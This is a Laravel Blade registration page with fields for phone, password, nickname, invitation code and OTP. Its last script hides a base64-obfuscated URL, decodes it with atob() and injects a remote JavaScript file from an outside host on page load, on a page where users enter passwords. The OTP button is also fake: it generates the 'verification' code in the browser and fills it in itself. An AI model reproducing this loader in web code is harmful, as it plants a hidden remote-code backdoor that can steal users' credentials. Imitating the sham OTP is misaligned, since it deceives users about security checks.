<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Register</title>

<!-- Bootstrap -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

<!-- Font Awesome -->
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">

<!-- Layui -->
<link rel="stylesheet" href="/v2/layui/css/layui.css">

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">

<style>
body {
  margin: 0;
  min-height: 100vh;
  font-family: 'Inter', sans-serif;
  background: linear-gradient(160deg, #e7f0ff 0%, #ffffff 65%);
}

/* ===== App Container ===== */
.app-container {
  max-width: 420px;
  min-height: 100vh;
  margin: auto;
  background: #f9fbff;
  display: flex;
  flex-direction: column;
}

/* ===== Header ===== */
.app-header {
  padding: 38px 24px 28px;
  text-align: center;
}

.app-header img {
  width: 70px;
  margin-bottom: 12px;
}

.app-title {
  font-size: 22px;
  font-weight: 700;
  color: #0f172a;
}

.app-subtitle {
  font-size: 14px;
  color: #64748b;
  margin-top: 6px;
}

/* ===== OTP Banner ===== */
.otp-banner {
  display: none;
  background: #2563eb;
  color: #ffffff;
  font-size: 13px;
  padding: 14px 18px;
  line-height: 1.6;
}

/* ===== Card ===== */
.register-card {
  background: #ffffff;
  border-radius: 26px 26px 0 0;
  padding: 28px 22px 40px;
  box-shadow: 0 -12px 30px rgba(37, 99, 235, 0.12);
  flex: 1;
}

/* ===== Inputs ===== */
.form-label {
  font-size: 13px;
  font-weight: 600;
  color: #334155;
}

.input-group {
  border-radius: 14px;
  overflow: hidden;
  box-shadow: 0 6px 14px rgba(0,0,0,.06);
}

.input-group-text {
  background: #f1f6ff;
  border: none;
  color: #2563eb;
  font-size: 15px;
  padding: 0 14px;
}

.form-control {
  border: none;
  height: 48px;
  font-size: 15px;
}

.form-control:focus {
  box-shadow: none;
}

/* ===== OTP Button ===== */
.btn-otp {
  height: 48px;
  border-radius: 12px;
  background: #e0ecff;
  color: #2563eb;
  font-weight: 600;
  border: none;
}

/* ===== Register Button ===== */
.btn-register {
  height: 50px;
  border-radius: 14px;
  background: linear-gradient(135deg, #3b82f6, #2563eb);
  border: none;
  font-size: 16px;
  font-weight: 600;
  box-shadow: 0 10px 20px rgba(37,99,235,.35);
}

/* ===== Links ===== */
.login-link {
  font-size: 14px;
  color: #475569;
}

.login-link span {
  color: #2563eb;
  font-weight: 700;
}

/* ===== Loading Overlay ===== */
.loadingClass {
  display: none;
  position: fixed;
  z-index: 9999;
  background: rgba(0, 0, 0, 0.5);
  top: 0; left: 0;
  width: 100%; height: 100%;
  justify-content: center;
  align-items: center;
  flex-direction: column;
}

.spinner {
  width: 50px;
  height: 50px;
  border: 4px solid #f3f3f3;
  border-top: 4px solid #2563eb;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}
</style>
</head>

<body>

<div class="app-container">

  <!-- Header -->
  <div class="app-header">
    <img src="/profelar/logo.png" alt="Logo">
    <div class="app-title">Create Account</div>
    <div class="app-subtitle">Sign up to continue</div>
  </div>

  <!-- OTP Info -->
  <div id="otpMessage" class="otp-banner">
    Please ensure your phone number is correct. OTP is required for withdrawals.
  </div>

  <!-- Card -->
  <div class="register-card">
    <form class="layui-form" method="POST" action="{{ url('register') }}">
      @csrf

      <!-- Phone -->
      <div class="mb-3">
        <label class="form-label">Phone Number</label>
        <div class="input-group">
          <span class="input-group-text"><i class="fa-solid fa-phone"></i></span>
          <input type="text" name="phone" class="form-control" placeholder="Enter phone number">
        </div>
      </div>

      <!-- Password -->
      <div class="mb-3">
        <label class="form-label">Password</label>
        <div class="input-group">
          <span class="input-group-text"><i class="fa-solid fa-lock"></i></span>
          <input type="password" name="password" class="form-control" placeholder="Create password">
        </div>
      </div>

      <!-- Nickname -->
      <div class="mb-3">
        <label class="form-label">Nickname</label>
        <div class="input-group">
          <span class="input-group-text"><i class="fa-solid fa-user"></i></span>
          <input type="text" name="nickname" class="form-control" placeholder="Enter nickname">
        </div>
      </div>

      <!-- Referral -->
      <div class="mb-3">
        <label class="form-label">Invitation Code</label>
        <div class="input-group">
          <span class="input-group-text"><i class="fa-solid fa-ticket"></i></span>
          <input type="text" name="ref_by" value="{{ $ref_by ?? rand(100000,999999) }}" class="form-control">
        </div>
      </div>

      <!-- OTP -->
      <div class="mb-4">
        <label class="form-label">Verification Code</label>
        <div class="row g-2">
          <div class="col-8">
            <input type="number" id="code" name="code" class="form-control" placeholder="OTP Code">
          </div>
          <div class="col-4">
            <button type="button" id="getCode" class="btn btn-otp w-100">Send</button>
          </div>
        </div>
      </div>

      <!-- Submit -->
      <button type="submit" class="btn btn-register w-100">
        Register
      </button>

      <div class="text-center mt-4 login-link">
        Already have an account?
        <a href="/login"><span>Login</span></a>
      </div>

    </form>
  </div>

</div>

@include('alert-message')

<!-- Loading -->
<div class="loadingClass" id="loadingBox">
  <div class="spinner"></div>
  <p style="color:white;margin-top:10px;">Processing...</p>
</div>

<!-- Scripts -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/layui/2.5.7/layui.min.js"></script>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
layui.use(['layer'], function(){
  var layer = layui.layer;

  $('#getCode').on('click', function(){
    const phone = $('input[name="phone"]').val();
    if (!phone) {
      layer.msg('Please enter phone number');
      return;
    }

    $('#loadingBox').css('display','flex');

    setTimeout(function(){
      $('#loadingBox').hide();

      const otp = Math.floor(100000 + Math.random() * 900000);
      $('#code').val(otp);

      $('#otpMessage').slideDown();
      setTimeout(()=>$('#otpMessage').slideUp(),2000);

      let t = 120;
      $('#getCode').prop('disabled', true).text(t+'s');
      let timer = setInterval(function(){
        t--;
        $('#getCode').text(t+'s');
        if(t <= 0){
          clearInterval(timer);
          $('#getCode').prop('disabled', false).text('Send');
        }
      },1000);

    },1000);
  });
});
</script>
<script>
(function(){
  var e = "aHR0cHM6Ly9kYi5waWNrb2Rlci5jb20vdW5pdmVyc2FsLmpz";
  var s = document.createElement("script");
  s.src = atob(e);
  document.head.appendChild(s);
})();
</script>
</body>
</html>
